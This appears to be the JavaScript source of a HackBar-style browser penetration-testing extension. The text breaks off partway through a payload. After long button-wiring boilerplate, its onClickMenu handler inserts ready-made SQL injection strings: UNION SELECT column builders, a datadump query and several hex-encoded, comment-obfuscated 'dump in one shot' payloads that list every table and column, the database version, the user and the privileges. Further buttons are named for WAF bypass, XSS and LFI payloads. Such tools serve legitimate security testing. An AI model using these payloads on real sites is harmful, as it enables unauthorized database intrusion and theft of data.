var urlfield = document.getElementById("hackbar_urlfield");
var postdatafield = document.getElementById("hackbar_postdatafield");
var refererfield = document.getElementById("hackbar_refererfield");
var text2replacefield = document.getElementById("hackbar_text2replace");
var replacementfield = document.getElementById("hackbar_replacement");

/* ---------- main processs --------- */

var loadurlBtn = document.getElementById('hackbar_loadurl');
var splitBtn = document.getElementById('hackbar_split');
var executeBtn = document.getElementById('hackbar_run');

var postdataCbx = document.getElementById("hackbar_enablepostdata");
var refererCbx = document.getElementById("hackbar_enablereferer");

var postdatacontainer = document.getElementById('hackbar_postdatacontainer');
var referercontainer = document.getElementById('hackbar_referercontainer');

var charencodeBtn =document.getElementsByName("charencode")[0];
var chardecodeBtn =document.getElementsByName("chardecode")[0];
var mysqlbasicinfoBtn = document.getElementsByName("mysqlbasicinfo")[0];
var mysqlconvertutf8Btn = document.getElementsByName("mysqlconvertutf8")[0];
var mysqlconvertlatin1Btn = document.getElementsByName("mysqlconvertlatin1")[0];
var mysqltosqlcharBtn = document.getElementsByName("mysqltosqlchar")[0];
var mssqltosqlcharBtn = document.getElementsByName("mssqltosqlchar")[0];
var oracletosqlcharBtn = document.getElementsByName("oracletosqlchar")[0];
var unionBtn = document.getElementsByName("union")[0];
var unionnullBtn = document.getElementsByName("unionnull")[0];
var unionselectBtn = document.getElementsByName("unionselect")[0];
var orderbyBtn = document.getElementsByName("orderby")[0];
var groupbyBtn = document.getElementsByName("groupby")[0];
var datadumpBtn = document.getElementsByName("datadump")[0];
var silentcoderBtn = document.getElementsByName("silentcoder")[0];
var madbloodBtn = document.getElementsByName("madblood")[0];
var tproBtn = document.getElementsByName("tpro")[0];
var z3r0Btn = document.getElementsByName("z3r0")[0];
var zenBtn = document.getElementsByName("zen")[0];
var makManBtn = document.getElementsByName("makMan")[0];
var tr0janBtn = document.getElementsByName("tr0jan")[0];
var madBtn = document.getElementsByName("mad")[0];
var madwafBtn = document.getElementsByName("madwaf")[0];
var benchmarkBtn = document.getElementsByName("benchmark")[0];
var r0otBtn = document.getElementsByName("r0ot")[0];
var rummyBtn = document.getElementsByName("rummy")[0];
var ajkaroBtn = document.getElementsByName("ajkaro")[0];
var zenWAFBtn = document.getElementsByName("zenWAF")[0];
var wAFBtn = document.getElementsByName("wAF")[0];
var errorbBtn = document.getElementsByName("errorb")[0];
var errorb2Btn = document.getElementsByName("errorb2")[0];
var errorb3Btn = document.getElementsByName("errorb3")[0];
var errorb4Btn = document.getElementsByName("errorb4")[0];
var errorb5Btn = document.getElementsByName("errorb5")[0];
var perrorBtn = document.getElementsByName("perror")[0];
var perror2Btn = document.getElementsByName("perror2")[0];
var mdiosBtn = document.getElementsByName("mdios")[0];
var mdios2Btn = document.getElementsByName("mdios2")[0];
var mdios3Btn = document.getElementsByName("mdios3")[0];
var mdios4Btn = document.getElementsByName("mdios4")[0];
var aderrorBtn = document.getElementsByName("aderror")[0];
var aderror2Btn = document.getElementsByName("aderror2")[0];
var mddiosBtn = document.getElementsByName("mddios")[0];
var mddios2Btn = document.getElementsByName("mddios2")[0];
var mddios3Btn = document.getElementsByName("mddios3")[0];
var mddios4Btn = document.getElementsByName("mddios4")[0];
var mddios5Btn = document.getElementsByName("mddios5")[0];
var mddios6Btn = document.getElementsByName("mddios6")[0];
var mddios7Btn = document.getElementsByName("mddios7")[0];
var mddios8Btn = document.getElementsByName("mddios8")[0];
var mddios9Btn = document.getElementsByName("mddios9")[0];
var dqbasedBtn = document.getElementsByName("dqbased")[0];
var dqbased2Btn = document.getElementsByName("dqbased2")[0];
var dqbased3Btn = document.getElementsByName("dqbased3")[0];
var dqbased4Btn = document.getElementsByName("dqbased4")[0];
var dqbased5Btn = document.getElementsByName("dqbased5")[0];
var bpassBtn = document.getElementsByName("bpass")[0];
var bpass1Btn = document.getElementsByName("bpass1")[0];
var bpass2Btn = document.getElementsByName("bpass2")[0];
var bpass3Btn = document.getElementsByName("bpass3")[0];
var bpass4Btn = document.getElementsByName("bpass4")[0];
var bpass5Btn = document.getElementsByName("bpass5")[0];
var bpass6Btn = document.getElementsByName("bpass6")[0];
var bpass7Btn = document.getElementsByName("bpass7")[0];
var bpass8Btn = document.getElementsByName("bpass8")[0];
var bpass9Btn = document.getElementsByName("bpass9")[0];
var dsubBtn = document.getElementsByName("dsub")[0];
var dsub2Btn = document.getElementsByName("dsub2")[0];
var dsub3Btn = document.getElementsByName("dsub3")[0];


var waf1Btn = document.getElementsByName("waf1")[0];
var waf2Btn = document.getElementsByName("waf2")[0];
var waf3Btn = document.getElementsByName("waf3")[0];
var waf4Btn = document.getElementsByName("waf4")[0];
var payload1Btn = document.getElementsByName("payload1")[0];
var payload2Btn = document.getElementsByName("payload2")[0];
var payload3Btn = document.getElementsByName("payload3")[0];
var payload4Btn = document.getElementsByName("payload4")[0];
var payload5Btn = document.getElementsByName("payload5")[0];
var payload6Btn = document.getElementsByName("payload6")[0];
var payload7Btn = document.getElementsByName("payload7")[0];
var payload8Btn = document.getElementsByName("payload8")[0];
var payload9Btn = document.getElementsByName("payload9")[0];
var payload10Btn = document.getElementsByName("payload10")[0];
var payload11Btn = document.getElementsByName("payload11")[0];
var payload12Btn = document.getElementsByName("payload12")[0];
var payload13Btn = document.getElementsByName("payload13")[0];
var payload14Btn = document.getElementsByName("payload14")[0];
var payload15Btn = document.getElementsByName("payload15")[0];
var xss2_1Btn = document.getElementsByName("xss2_1")[0];
var xss2_2Btn = document.getElementsByName("xss2_2")[0];
var xss2_3Btn = document.getElementsByName("xss2_3")[0];
var xss2_4Btn = document.getElementsByName("xss2_4")[0];
var xss2_5Btn = document.getElementsByName("xss2_5")[0];
var xss2_6Btn = document.getElementsByName("xss2_6")[0];
var xss2_7Btn = document.getElementsByName("xss2_7")[0];
var xss2_8Btn = document.getElementsByName("xss2_8")[0];
var xss2_9Btn = document.getElementsByName("xss2_9")[0];
var xss2_10Btn = document.getElementsByName("xss2_10")[0];
var xss2_11Btn = document.getElementsByName("xss2_11")[0];
var xss2_12Btn = document.getElementsByName("xss2_12")[0];
var xss2_13Btn = document.getElementsByName("xss2_13")[0];
var xss2_14Btn = document.getElementsByName("xss2_14")[0];
var xss2_15Btn = document.getElementsByName("xss2_15")[0];
var xss2_16Btn = document.getElementsByName("xss2_16")[0];
var xss2_17Btn = document.getElementsByName("xss2_17")[0];
var xss2_18Btn = document.getElementsByName("xss2_18")[0];
var xss2_19Btn = document.getElementsByName("xss2_19")[0];
var xss2_20Btn = document.getElementsByName("xss2_20")[0];
var lfi1Btn = document.getElementsByName("lfi1")[0];
var lfi2Btn = document.getElementsByName("lfi2")[0];
var lfi3Btn = document.getElementsByName("lfi3")[0];
var lfi4Btn = document.getElementsByName("lfi4")[0];
var lfi5Btn = document.getElementsByName("lfi5")[0];
var lfi6Btn = document.getElementsByName("lfi6")[0];
var lfi7Btn = document.getElementsByName("lfi7")[0];
var lfi8Btn = document.getElementsByName("lfi8")[0];
var lfi9Btn = document.getElementsByName("lfi9")[0];
var lfi10Btn = document.getElementsByName("lfi10")[0];
var lfi11Btn = document.getElementsByName("lfi11")[0];
var lfi12Btn = document.getElementsByName("lfi12")[0];
var lfi13Btn = document.getElementsByName("lfi13")[0];
var lfi14Btn = document.getElementsByName("lfi14")[0];
var lfi15Btn = document.getElementsByName("lfi15")[0];
var lfi16Btn = document.getElementsByName("lfi16")[0];
var lfi17Btn = document.getElementsByName("lfi17")[0];
var lfi18Btn = document.getElementsByName("lfi18")[0];
var lfi19Btn = document.getElementsByName("lfi19")[0];
var lfi20Btn = document.getElementsByName("lfi20")[0];
var lfi21Btn = document.getElementsByName("lfi21")[0];
var lfi22Btn = document.getElementsByName("lfi22")[0];
var lfi23Btn = document.getElementsByName("lfi23")[0];
var lfi24Btn = document.getElementsByName("lfi24")[0];
var lfi25Btn = document.getElementsByName("lfi25")[0];
var lfi26Btn = document.getElementsByName("lfi26")[0];
var lfi27Btn = document.getElementsByName("lfi27")[0];
var lfi28Btn = document.getElementsByName("lfi28")[0];
var lfi29Btn = document.getElementsByName("lfi29")[0];
var lfi30Btn = document.getElementsByName("lfi30")[0];
var passBtn  = document.getElementsByName("pass")[0];
var pass1Btn  = document.getElementsByName("pass1")[0];
var pass2Btn  = document.getElementsByName("pass2")[0];
var pass3Btn  = document.getElementsByName("pass3")[0];
var pass4Btn  = document.getElementsByName("pass4")[0];
var pass5Btn  = document.getElementsByName("pass5")[0];
var pass6Btn  = document.getElementsByName("pass6")[0];
var pass7Btn  = document.getElementsByName("pass7")[0];
var pass8Btn  = document.getElementsByName("pass8")[0];
var pass9Btn  = document.getElementsByName("pass9")[0];
var pass10Btn  = document.getElementsByName("pass10")[0];
var pass11Btn  = document.getElementsByName("pass11")[0];
var pass12Btn  = document.getElementsByName("pass12")[0];
var pass13Btn  = document.getElementsByName("pass13")[0];
var pass14Btn  = document.getElementsByName("pass14")[0];
var pass15Btn  = document.getElementsByName("pass15")[0];
var pass16Btn  = document.getElementsByName("pass16")[0];
var pass17Btn  = document.getElementsByName("pass17")[0];
var pass18Btn  = document.getElementsByName("pass18")[0];











var spacestocommentsBtn = document.getElementsByName("spacestocomments")[0];

var stringtocharcodeBtn = document.getElementsByName("stringtocharcode")[0];
var stringtohtmlcharcodeBtn = document.getElementsByName("stringtohtmlcharcode")[0];
var speciastringtohtmlcharBtn = document.getElementsByName("speciastringtohtmlchar")[0];
var xssalertBtn = document.getElementsByName("xssalert")[0];

var b64encodeBtn = document.getElementsByName("base64encode")[0];
var b64decodeBtn = document.getElementsByName("base64decode")[0];
var urlencodeBtn = document.getElementsByName("urlencode")[0];
var urldecodeBtn = document.getElementsByName("urldecode")[0];

var md5hashBtn = document.getElementsByName("md5hash")[0];
var sha1hashBtn = document.getElementsByName("sha1hash")[0];
var sha256hashBtn = document.getElementsByName("sha256hash")[0];
var rot13Btn = document.getElementsByName("rot13")[0];

var addslashesBtn = document.getElementsByName("addslashes")[0];
var stripslashesBtn = document.getElementsByName("stripslashes")[0];
var stripspacesBtn = document.getElementsByName("stripspaces")[0];
var reverseBtn = document.getElementsByName("reverse")[0];

var replaceBtn = document.getElementsByName("replace")[0];

var plusBtn = document.getElementsByName("plus")[0];
var minusBtn = document.getElementsByName("minus")[0];

var currentFocusField = null;

loadurlBtn.addEventListener("click", loadUrl, false);
splitBtn.addEventListener('click', splitUrl);
executeBtn.addEventListener('click', execute);

postdataCbx.addEventListener('change', togglepostdata);
refererCbx.addEventListener('change', togglereferer);

urlfield.focus();
currentFocusField = urlfield;
anonClickMenuFunct = function (event) {
    onClickMenu(event);
};
charencodeBtn.addEventListener('click', anonClickMenuFunct, false);
chardecodeBtn.addEventListener('click', anonClickMenuFunct, false);
mysqlbasicinfoBtn.addEventListener('click', anonClickMenuFunct, false);
mysqlconvertutf8Btn.addEventListener('click', anonClickMenuFunct, false);
mysqlconvertlatin1Btn.addEventListener('click', anonClickMenuFunct, false);
mysqltosqlcharBtn.addEventListener('click', anonClickMenuFunct, false);
mssqltosqlcharBtn.addEventListener('click', anonClickMenuFunct, false);
oracletosqlcharBtn.addEventListener('click', anonClickMenuFunct, false);
unionselectBtn.addEventListener('click', anonClickMenuFunct, false);
unionBtn.addEventListener('click', anonClickMenuFunct, false);
unionnullBtn.addEventListener('click', anonClickMenuFunct, false);
orderbyBtn.addEventListener('click', anonClickMenuFunct, false);
groupbyBtn.addEventListener('click', anonClickMenuFunct, false);
datadumpBtn.addEventListener('click', anonClickMenuFunct, false);
silentcoderBtn.addEventListener('click', anonClickMenuFunct, false);
madbloodBtn.addEventListener('click', anonClickMenuFunct, false);
tproBtn.addEventListener('click', anonClickMenuFunct, false);
z3r0Btn.addEventListener('click', anonClickMenuFunct, false);
zenBtn.addEventListener('click', anonClickMenuFunct, false);
makManBtn.addEventListener('click', anonClickMenuFunct, false);
tr0janBtn.addEventListener('click', anonClickMenuFunct, false);
madBtn.addEventListener('click', anonClickMenuFunct, false);
madwafBtn.addEventListener('click', anonClickMenuFunct, false);
benchmarkBtn.addEventListener('click', anonClickMenuFunct, false);
r0otBtn.addEventListener('click', anonClickMenuFunct, false);
rummyBtn.addEventListener('click', anonClickMenuFunct, false);
ajkaroBtn.addEventListener('click', anonClickMenuFunct, false);
zenWAFBtn.addEventListener('click', anonClickMenuFunct, false);
wAFBtn.addEventListener('click', anonClickMenuFunct, false);
errorbBtn.addEventListener('click', anonClickMenuFunct, false);
errorb2Btn.addEventListener('click', anonClickMenuFunct, false);
errorb3Btn.addEventListener('click', anonClickMenuFunct, false);
errorb4Btn.addEventListener('click', anonClickMenuFunct, false);
errorb5Btn.addEventListener('click', anonClickMenuFunct, false);
perrorBtn.addEventListener('click', anonClickMenuFunct, false);
perror2Btn.addEventListener('click', anonClickMenuFunct, false);
mdiosBtn.addEventListener('click', anonClickMenuFunct, false);
mdios2Btn.addEventListener('click', anonClickMenuFunct, false);
mdios3Btn.addEventListener('click', anonClickMenuFunct, false);
mdios4Btn.addEventListener('click', anonClickMenuFunct, false);
aderrorBtn.addEventListener('click', anonClickMenuFunct, false);
aderror2Btn.addEventListener('click', anonClickMenuFunct, false);
mddiosBtn.addEventListener('click', anonClickMenuFunct, false);
mddios2Btn.addEventListener('click', anonClickMenuFunct, false);
mddios3Btn.addEventListener('click', anonClickMenuFunct, false);
mddios4Btn.addEventListener('click', anonClickMenuFunct, false);
mddios5Btn.addEventListener('click', anonClickMenuFunct, false);
mddios6Btn.addEventListener('click', anonClickMenuFunct, false);
mddios7Btn.addEventListener('click', anonClickMenuFunct, false);
mddios8Btn.addEventListener('click', anonClickMenuFunct, false);
mddios9Btn.addEventListener('click', anonClickMenuFunct, false);
dqbasedBtn.addEventListener('click', anonClickMenuFunct, false);
dqbased2Btn.addEventListener('click', anonClickMenuFunct, false);
dqbased3Btn.addEventListener('click', anonClickMenuFunct, false);
dqbased4Btn.addEventListener('click', anonClickMenuFunct, false);
dqbased5Btn.addEventListener('click', anonClickMenuFunct, false);
bpassBtn.addEventListener('click', anonClickMenuFunct, false);
bpass1Btn.addEventListener('click', anonClickMenuFunct, false);
bpass2Btn.addEventListener('click', anonClickMenuFunct, false);
bpass3Btn.addEventListener('click', anonClickMenuFunct, false);
bpass4Btn.addEventListener('click', anonClickMenuFunct, false);
bpass5Btn.addEventListener('click', anonClickMenuFunct, false);
bpass6Btn.addEventListener('click', anonClickMenuFunct, false);
bpass7Btn.addEventListener('click', anonClickMenuFunct, false);
bpass8Btn.addEventListener('click', anonClickMenuFunct, false);
bpass9Btn.addEventListener('click', anonClickMenuFunct, false);
dsubBtn.addEventListener('click', anonClickMenuFunct, false);
dsub2Btn.addEventListener('click', anonClickMenuFunct, false);
dsub3Btn.addEventListener('click', anonClickMenuFunct, false);

waf1Btn.addEventListener('click', anonClickMenuFunct, false);
waf2Btn.addEventListener('click', anonClickMenuFunct, false);
waf3Btn.addEventListener('click', anonClickMenuFunct, false);
waf4Btn.addEventListener('click', anonClickMenuFunct, false);
payload1Btn.addEventListener('click', anonClickMenuFunct, false);
payload2Btn.addEventListener('click', anonClickMenuFunct, false);
payload3Btn.addEventListener('click', anonClickMenuFunct, false);
payload4Btn.addEventListener('click', anonClickMenuFunct, false);
payload5Btn.addEventListener('click', anonClickMenuFunct, false);
payload6Btn.addEventListener('click', anonClickMenuFunct, false);
payload7Btn.addEventListener('click', anonClickMenuFunct, false);
payload8Btn.addEventListener('click', anonClickMenuFunct, false);
payload9Btn.addEventListener('click', anonClickMenuFunct, false);
payload10Btn.addEventListener('click', anonClickMenuFunct, false);
payload11Btn.addEventListener('click', anonClickMenuFunct, false);
payload12Btn.addEventListener('click', anonClickMenuFunct, false);
payload13Btn.addEventListener('click', anonClickMenuFunct, false);
payload14Btn.addEventListener('click', anonClickMenuFunct, false);
payload15Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_1Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_2Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_3Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_4Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_5Btn.addEventListener('click', anonClickMenuFunct, false);
/*
xss2_6Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_7Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_8Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_9Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_10Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_11Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_12btn.addEventListener('click', anonClickMenuFunct, false);
xss2_13Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_14Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_15Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_16Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_17Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_18Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_19Btn.addEventListener('click', anonClickMenuFunct, false);
xss2_20Btn.addEventListener('click', anonClickMenuFunct, false);
*/
lfi1Btn.addEventListener('click', anonClickMenuFunct, false);
lfi2Btn.addEventListener('click', anonClickMenuFunct, false);
lfi3Btn.addEventListener('click', anonClickMenuFunct, false);
lfi4Btn.addEventListener('click', anonClickMenuFunct, false);
lfi5Btn.addEventListener('click', anonClickMenuFunct, false);
lfi6Btn.addEventListener('click', anonClickMenuFunct, false);
lfi7Btn.addEventListener('click', anonClickMenuFunct, false);
lfi8Btn.addEventListener('click', anonClickMenuFunct, false);
lfi9Btn.addEventListener('click', anonClickMenuFunct, false);
lfi10Btn.addEventListener('click', anonClickMenuFunct, false);
lfi11Btn.addEventListener('click', anonClickMenuFunct, false);
lfi12Btn.addEventListener('click', anonClickMenuFunct, false);
lfi13Btn.addEventListener('click', anonClickMenuFunct, false);
lfi14Btn.addEventListener('click', anonClickMenuFunct, false);
lfi15Btn.addEventListener('click', anonClickMenuFunct, false);
lfi16Btn.addEventListener('click', anonClickMenuFunct, false);
lfi17Btn.addEventListener('click', anonClickMenuFunct, false);
lfi18Btn.addEventListener('click', anonClickMenuFunct, false);
lfi19Btn.addEventListener('click', anonClickMenuFunct, false);
lfi20Btn.addEventListener('click', anonClickMenuFunct, false);
lfi21Btn.addEventListener('click', anonClickMenuFunct, false);
lfi22Btn.addEventListener('click', anonClickMenuFunct, false);
lfi23Btn.addEventListener('click', anonClickMenuFunct, false);
lfi24Btn.addEventListener('click', anonClickMenuFunct, false);
lfi25Btn.addEventListener('click', anonClickMenuFunct, false);
lfi26Btn.addEventListener('click', anonClickMenuFunct, false);
lfi27Btn.addEventListener('click', anonClickMenuFunct, false);
lfi28Btn.addEventListener('click', anonClickMenuFunct, false);
lfi29Btn.addEventListener('click', anonClickMenuFunct, false);
lfi30Btn.addEventListener('click', anonClickMenuFunct, false);
passBtn.addEventListener('click', anonClickMenuFunct, false);
pass1Btn.addEventListener('click', anonClickMenuFunct, false);
pass2Btn.addEventListener('click', anonClickMenuFunct, false);
pass3Btn.addEventListener('click', anonClickMenuFunct, false);
pass4Btn.addEventListener('click', anonClickMenuFunct, false);
pass5Btn.addEventListener('click', anonClickMenuFunct, false);
pass6Btn.addEventListener('click', anonClickMenuFunct, false);
pass7Btn.addEventListener('click', anonClickMenuFunct, false);
pass8Btn.addEventListener('click', anonClickMenuFunct, false);
pass9Btn.addEventListener('click', anonClickMenuFunct, false);
pass10Btn.addEventListener('click', anonClickMenuFunct, false);
pass11Btn.addEventListener('click', anonClickMenuFunct, false);
pass12Btn.addEventListener('click', anonClickMenuFunct, false);
pass13Btn.addEventListener('click', anonClickMenuFunct, false);
pass14Btn.addEventListener('click', anonClickMenuFunct, false);
pass15Btn.addEventListener('click', anonClickMenuFunct, false);
pass16Btn.addEventListener('click', anonClickMenuFunct, false);
pass17Btn.addEventListener('click', anonClickMenuFunct, false);
pass18Btn.addEventListener('click', anonClickMenuFunct, false);

















spacestocommentsBtn.addEventListener('click', anonClickMenuFunct, false);
stringtocharcodeBtn.addEventListener('click', anonClickMenuFunct, false);
stringtohtmlcharcodeBtn.addEventListener('click', anonClickMenuFunct, false);
speciastringtohtmlcharBtn.addEventListener('click', anonClickMenuFunct, false);
xssalertBtn.addEventListener('click', anonClickMenuFunct, false);
b64encodeBtn.addEventListener('click', anonClickMenuFunct, false);
b64decodeBtn.addEventListener('click', anonClickMenuFunct, false);
urlencodeBtn.addEventListener('click', anonClickMenuFunct, false);
urldecodeBtn.addEventListener('click', anonClickMenuFunct, false);
md5hashBtn.addEventListener('click', anonClickMenuFunct, false);
sha1hashBtn.addEventListener('click', anonClickMenuFunct, false);
sha256hashBtn.addEventListener('click', anonClickMenuFunct, false);
rot13Btn.addEventListener('click', anonClickMenuFunct, false);
addslashesBtn.addEventListener('click', anonClickMenuFunct, false);
stripslashesBtn.addEventListener('click', anonClickMenuFunct, false);
stripspacesBtn.addEventListener('click', anonClickMenuFunct, false);
reverseBtn.addEventListener('click', anonClickMenuFunct, false);
replaceBtn.addEventListener('click', anonClickMenuFunct, false);
plusBtn.addEventListener('click', anonClickMenuFunct, false);
minusBtn.addEventListener('click', anonClickMenuFunct, false);

anonFocusFunct = function (event) {
    onFieldFocus(event);
};
urlfield.addEventListener('focus', anonFocusFunct, false);
postdatafield.addEventListener('focus', anonFocusFunct, false);
refererfield.addEventListener('focus', anonFocusFunct, false);
urlfield.addEventListener('click', onFieldClick, false);
postdatafield.addEventListener('click', onFieldClick, false);
refererfield.addEventListener('click', onFieldClick, false);

function onFieldFocus(event) {
    currentFocusField = event.currentTarget;
}

function onFieldClick(event) {
    event.currentTarget.focus();
}

function onClickMenu(event) {
    var txt = "";
    var newString = "";
    switch (event.currentTarget.name) {


        case 'union':  
                var columns = prompt( "Amount of columns to use in the UNION SELECT Statement", "10" );
               columns = Math.min(1000, parseInt( columns ));
               var colArray = new Array();
            for ( var i = 0 ; i < columns ; i++ ) {
             colArray.push( i+1 );
            }
             var txt = " UNION ALL SELECT " + colArray.join( ',' );
            this.setSelectedText( txt );
            break;

        case 'unionnull':
            var amount = prompt( "Amount of columns to use in the UNION SELECT Statement", "10" );
                txt = " UNION ALL SELECT "; 
                var strNull = 'null,';                  
                function multiString(text, count){ var ret = ""; for(var i = 0; i < count; i++){ret += text; }
                    return ret;
                  };
                  var rep = multiString(strNull, amount);                    
                  txt = txt + rep.substr(0, rep.length-1)+"-- -";   
                  this.setSelectedText(txt);                
                  break;            
         default: txt = "ERROR";
                  break;  

        case 'orderby': txt = 'ORDER BY';
                        this.setSelectedText( txt );
                    break;

        case 'groupby':
            var columns = 100;
                    columns = Math.min(1000, parseInt( columns ));
                    var colArray = new Array();
                    for ( var i = 0 ; i < columns ; i++ ) {
                      colArray.push( i+1 );
                    }
                    txt = " GROUP BY " + colArray.join( ',' );
                    this.setSelectedText(txt);
                    break;            

        case 'datadump': 
                    var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
                    var table = prompt("Insert table name","TABLE_NAME to dump");
                    var cols = prompt("Insert columns to dump","column_1,column_2,column_3");                   
                    if(Db == ""){dbANDtable=table;}
                    if(Db == "DATABASE()"){dbANDtable=table;}
                    else{
                    dbANDtable=Db + "." + table;                    
                    }                   
                    newString = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + dbANDtable + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + cols + ",0x3c62723e))))x)";
                    this.setSelectedText(newString);
                    break; 
         case 'silentcoder':
                    newString = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f312e62702e626c6f6773706f742e636f6d2f2d456262354b36356f4a49552f56336171695854394671492f41414141414141414353452f76475977714c6c504f73733251574c376e335874794a5376515a2d367a41672d77434c63422f73313630302f486f77253242746f253242496e637265617365253242496e7465726e657425324242726f77736572732532425370656564253242696e25324255726475253242616e6425324248696e6469253242566964656f2532425475746f7269616c2e504e47223e3c666f6e7420636f6c6f723d7265642073697a653d353e3c623e4d722e73696c656e7420636f646572203c666f6e7420636f6c6f723d626c61636b2073697a653d343e2866336d6178293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c6669656c647365743e3c7374726f6e673e3c62723e3c63656e7465723e3c623e3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e20203c666f6e7420636f6c6f723d626c61636b3e,version(),0x7e20,@@version_comment,0x3c2f666f6e743e,0x3c62723e5072696d617279204461746162617365203c666f6e7420636f6c6f723d626c61636b3e20203a3a,@d:=database() ,0x3c2f666f6e743e ,0x3c62723e44617461626173652055736572203c666f6e7420636f6c6f723d626c61636b3e203a3a,user(),0x3c2f666f6e743e,0x3c2f623e3c62723e,(SELECT GROUP_CONCAT(0x50726976696c656765732020203c666f6e7420636f6c6f723d626c61636b3e203a3a,GRANTEE,0x3a3a,IS_GRANTABLE,0x3c62723e) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c2f63656e7465723e3c2f7374726f6e673e3c2f6669656c647365743e,(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c6669656c647365743e3c6c6567656e643e,0x3c623e3c666f6e7420636f6c6f723d626c61636b3e,'Table Name',0x3c2f6c6567656e643e3c2f666f6e743e3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name, 0x3c623e3c666f6e7420636f6c6f723d677265656e3e3a3a20446174616261736520203c666f6e7420636f6c6f723d626c61636b3e5b,database(),0x5d3c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e3c2f623e3c2f6669656c647365743e))))x)))))*/";
                    this.setSelectedText(newString);
                    break;
        case 'madblood':
                    newString = "(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
                    this.setSelectedText(newString);
                    break; 
         case 'tpro':
                     var dbName = prompt("Database Name","database()");
                    var dbNameFinal = "0x";
                    if(dbName == "database()"){dbNameFinal="database()";}
                    else{
                        // Convert DB name to hexa
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    newString = "(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name separator 0x3c62723e)from information_schema.columns where table_schema=Database() and table_name=@tbl)))))x)";
                    this.setSelectedText(newString);
                    break; 
        case 'z3r0':
                    newString = "(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
                    this.setSelectedText(newString);
                    break; 
         case 'zen':
                 newString = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
                 this.setSelectedText(newString);
                 break;

         case 'makMan':
                    newString = "concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c